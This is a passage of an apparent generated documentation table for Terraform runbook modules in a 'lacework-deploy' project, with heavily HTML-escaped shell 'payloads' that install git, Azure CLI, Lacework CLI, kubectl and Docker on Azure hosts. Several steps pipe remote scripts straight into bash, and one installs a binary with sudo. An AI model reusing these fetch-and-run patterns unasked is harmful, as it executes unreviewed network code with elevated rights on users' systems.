docker&amp;#45;engine<br/>        yum install &amp;#45;y yum&amp;#45;utils<br/>        yum&amp;#45;config&amp;#45;manager &amp;#45;&amp;#45;add&amp;#45;repo https://download&amp;#46;docker&amp;#46;com/linux/centos/docker&amp;#45;ce&amp;#46;repo<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;docker&amp;#45;ce docker&amp;#45;ce&amp;#45;cli containerd&amp;#46;io docker&amp;#45;buildx&amp;#45;plugin docker&amp;#45;compose&amp;#45;plugin&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        &amp;#35; ensure non root users are added to the docker group<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>        fi<br/>        EOT<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| target-runbook-deploy-git                                | ./modules/runbook/deploy-git                         | runbook_deploy_git                               | context.azure.runbook.deploy_git                                  | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_git&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-git                         | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;git&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>     if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;git&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;git&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-runbook-azure-cli                                 | ./modules/runbook/deploy-azure-cli                   | runbook_deploy_azure_cli                         | context.azure.runbook.deploy_azure_cli                            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_azure_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-cli                   | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;az&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>        curl &amp;#45;sL https://aka&amp;#46;ms/InstallAzureCLIDeb &amp;#124; bash <br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/>    <br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| target-runbook-lacework-cli                              | ./modules/runbook/deploy-lacework-cli                | runbook_deploy_lacework_cli                      | context.azure.runbook.deploy_lacework_cli                         | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-cli                | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;lacework&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>        curl https://raw&amp;#46;githubusercontent&amp;#46;com/lacework/go&amp;#45;sdk/main/cli/install&amp;#46;sh &amp;#124; bash<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-runbook-kubectl-cli                               | ./modules/runbook/deploy-kubectl-cli                 | runbook_deploy_kubectl_cli                       | context.azure.runbook.deploy_kubectl_cli                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_kubectl_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-kubectl-cli                 | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;kubectl&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>        curl &amp;#45;LO &quot;https://storage&amp;#46;googleapis&amp;#46;com/kubernetes&amp;#45;release/release/$&amp;&amp;#35;40;curl &amp;#45;s https://storage&amp;#46;googleapis&amp;#46;com/kubernetes&amp;#45;release/release/stable&amp;#46;txt&amp;&amp;#35;41;/bin/linux/amd64/kubectl&quot;<br/>        sudo install &amp;#45;o root &amp;#45;g root &amp;#45;m 0755 kubectl /usr/local/bin/kubectl<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;jq&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
